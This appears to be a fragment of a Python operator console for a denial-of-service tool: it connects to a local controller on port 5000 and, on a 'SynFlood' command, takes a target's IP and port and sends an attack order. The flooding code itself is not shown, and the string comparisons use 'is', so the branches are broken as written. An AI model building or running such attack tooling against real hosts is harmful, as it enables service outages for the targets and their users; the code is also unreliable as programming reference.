import sys
import os
from multiprocessing.connection import Client

c = Client(('localhost', 5000))

while 1:
    command = input("Enter a command: ")
    if command is 'help':
        pass
    elif command is 'SynFlood':
        data = input("Enter Target's IP and Port <IP> <Port>").split(' ')
        c.send(f'1 {data[0]} {data[1]}')
